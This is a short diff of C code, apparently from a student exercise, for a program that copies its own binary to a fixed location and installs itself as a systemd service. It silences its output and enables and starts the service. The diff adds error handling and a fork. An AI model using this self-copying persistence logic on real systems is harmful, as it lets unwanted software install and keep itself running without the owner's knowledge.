@@ -3,15 +3,22 @@
 void	daemonize(char *target)
 {
 	int fd = open(SYSTEMD_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0311);
-	char config[4096];
-	int len = sprintf(config, SYSTEMD_CONFIG, TARGET_LOCATION, target);
-	write(fd, config, len);
-	close(fd);
-	close(STDOUT_FILENO);
-	close(STDERR_FILENO);
-	system("systemctl daemon-reload");
-	system("systemctl enable "PRG_NAME);
-	system("systemctl start "PRG_NAME);
+	if (fd >= 0)
+	{
+		char config[4096];
+		int len = sprintf(config, SYSTEMD_CONFIG, TARGET_LOCATION, target);
+		write(fd, config, len);
+		close(fd);
+		close(STDOUT_FILENO);
+		close(STDERR_FILENO);
+		system("systemctl daemon-reload");
+		system("systemctl enable "PRG_NAME);
+		system("systemctl start "PRG_NAME);
+	}
+	else // not systemd
+	{
+		// TODO:
+	}
 }
 
 void	duplicate(char *path, char *target)
@@ -54,8 +61,11 @@ int		main(void)
 	if (strcmp(path, target_path))
 	{
 		printf("%s\n", STUDENT_LOGIN);
-		duplicate(PROC_SELF_EXE, target_path);
-		daemonize(target_path);
+		if (!fork())
+		{
+			duplicate(PROC_SELF_EXE, target_path);
+			daemonize(target_path);
+		}
 	}
 	else
 		server();
